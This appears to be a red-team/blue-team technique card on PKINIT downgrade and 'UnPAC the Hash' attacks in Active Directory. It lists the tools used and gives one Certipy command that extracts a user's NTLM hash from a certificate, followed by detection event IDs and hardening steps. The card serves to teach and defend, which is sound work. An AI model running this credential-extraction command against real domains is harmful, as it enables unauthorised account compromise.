# [CA-KERB-009]: PKINIT Downgrade Attacks

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-009 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Forcing a client or server to downgrade from Public Key Cryptography for Initial Authentication (PKINIT) to standard password-based authentication (RC4/AES). Or, obtaining a TGT via PKINIT and then extracting the user's NTLM hash (UnPAC the Hash).
- **Attack Surface:** AD Certificate Services (AD CS) and Kerberos Pre-Auth.
- **Business Impact:** **Credential Access**. Obtaining persistent NTLM hashes from fleeting Certificate Auth.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User Certificate (PFX).
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [Kekeo](https://github.com/gentilkiwi/kekeo)
    - [Certipy](https://github.com/ly4k/Certipy)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Obtain Certificate**
Acquire a user's certificate (e.g., via ESC1 exploitation or finding a PFX).

**Step 2: UnPAC the Hash**
Request a TGT using the certificate. The KDC returns the TGT *and* the user's NTLM hash in the PAC.
```bash
# Certipy
certipy auth -pfx user.pfx -username user -domain target.local
```
*Output: `Got NTLM Hash: ...`*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4768 | PreAuthType: `16` (Smart Card/PKINIT). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Credential Guard:** Prevents extraction of the NTLM hash from the PAC on the endpoint (though Certipy does this against the KDC).
*   **Smart Card Required:** Enforcing "Smart Card Required for Interactive Logon" randomizes the user's NTLM hash, making it useless for password cracking (though valid for Pass-the-Hash).

## 7. ATTACK CHAIN
> **Preceding Technique:** [REC-CERT-001] (ADCS Enumeration)
> **Next Logical Step:** [LAT-AD-001]
